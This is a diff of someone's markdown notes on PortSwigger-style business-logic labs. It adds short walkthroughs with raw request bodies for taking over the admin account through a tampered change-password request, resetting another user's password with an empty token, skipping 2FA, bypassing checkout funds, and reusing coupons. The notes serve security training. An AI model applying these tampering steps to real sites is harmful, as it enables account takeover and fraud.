@@ -527,20 +527,40 @@
   - **Email** truncated to **255 chrs**
   - Register "[Long string chrs total of 255 including sudomain add]@dontwannacry.com.exploit-0a6500480408835d81947f9901c70002.exploit-server.net"
 - Inconsistent security controls
+  - **Trusted users won't always remain trustworthy**
   - Use admin subdomain as email and login as admin type user
   - admin page found > "Admin interface only available if logged in as a **DontWannaCry** user"
   - Update email as hacker**@DontWannaCry.com**
 - Weak isolation on dual-use endpoint
   - change password for admin (remove current-password param, and update username)
   - POST /my-account/change-password
-  - original: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&username=wiener&**current-password=peter**&new-password-1=123456&new-password-2=123456
+  - original: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&username=wiener&~~scurrent-password=peter~~s&new-password-1=123456&new-password-2=123456
   - modified: csrf=hiBmOK76o47QdE1pZyFWgQiGNXSv73Od&**username=administrator**&&new-password-1=123456&new-password-2=123456
-- Password reset broken logic
-- 2FA simple bypass 
+- **Password reset broken logic**
+  - **remove one parameter** at a time > deleting the name of the parameter as well as the **value**
+  - Users won't always supply mandatory input
+  - **temp-forgot-password-token**=~~sa5fk32fn68feb75ik9xp91sfoekxn11j~~s&username=wiener&new-password-1=123456&new-password-2=123456
+  - temp-forgot-password-token=&**username=carlos**&new-password-1=123456&new-password-2=123456  
+- **2FA simple bypass**
+  - Users won't always follow the **intended sequence**
+  - skip to logged in page after 1FA
 - Insufficient workflow validation
+  - **Add Jacket** into cart
+    - POST /cart/checkout   
+  - **Error**
+    - GET **/cart?err=INSUFFICIENT_FUNDS**
+    - Not enough store credit for this purchase
+  - Send to **repeater** to a confirmation order page
+    - GET **/cart/order-confirmation?order-confirmed=true**
 - Authentication bypass via flawed state machine
+  - Login and intercept the next request
+    - POST /login HTTP/1.1
+    - csrf=5Y6EM5R6dxSayGitTEtdKdury3rwgN8X&username=wiener&password=peter   
+  - **Drop the next request** GET /role-selector
+    - browse to admin page, now defaulted as administrator
 - Flawed enforcement of business rules
-- Infinite money logic flaw
+  - alternate 2 different coupon codes and reuse it multiple times (NEWCUST5, SIGNUP30)   
+- Infinite money logic flaw   
 - Authentication bypass via encryption oracle   
 
 ## Command Injection
